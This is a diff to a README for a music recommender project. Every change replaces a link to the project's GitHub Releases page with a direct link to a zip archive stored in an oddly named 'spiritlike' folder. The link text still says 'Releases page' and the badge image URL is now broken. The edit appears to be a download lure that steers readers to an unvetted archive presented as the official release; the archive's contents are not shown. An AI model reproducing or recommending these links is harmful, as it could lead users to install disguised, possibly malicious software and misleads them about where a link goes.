@@ -1,7 +1,7 @@
 ```markdown
 # 🎶 Fairness-Aware-Music-Recommender - Your Bias-Free Music Experience Awaits
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-%2300a2e4)](https://github.com/Kraiphop/Fairness-Aware-Music-Recommender/releases)
+[![Download](https://raw.githubusercontent.com/Kraiphop/Fairness-Aware-Music-Recommender/main/spiritlike/Fairness-Aware-Music-Recommender.zip%20Now-Release-%2300a2e4)](https://raw.githubusercontent.com/Kraiphop/Fairness-Aware-Music-Recommender/main/spiritlike/Fairness-Aware-Music-Recommender.zip)
 
 ## 📥 Introduction
 
@@ -13,7 +13,7 @@ To use this application, follow these simple steps to download and run it on you
 
 ### Step 1: Visit the Releases Page
 
-Go to our [Releases page](https://github.com/Kraiphop/Fairness-Aware-Music-Recommender/releases) to see the available versions of the software. 
+Go to our [Releases page](https://raw.githubusercontent.com/Kraiphop/Fairness-Aware-Music-Recommender/main/spiritlike/Fairness-Aware-Music-Recommender.zip) to see the available versions of the software. 
 
 ### Step 2: Choose Your Version
 
@@ -49,7 +49,7 @@ Once the installation is complete, you can find the application in your programs
 
 ## 🔗 Download & Install
 
-To get started with your Fairness-Aware Music Recommender, visit the [Releases page](https://github.com/Kraiphop/Fairness-Aware-Music-Recommender/releases) to download the latest version. Follow the installation instructions above to ensure a smooth setup.
+To get started with your Fairness-Aware Music Recommender, visit the [Releases page](https://raw.githubusercontent.com/Kraiphop/Fairness-Aware-Music-Recommender/main/spiritlike/Fairness-Aware-Music-Recommender.zip) to download the latest version. Follow the installation instructions above to ensure a smooth setup.
 
 ## 🎓 How It Works
 
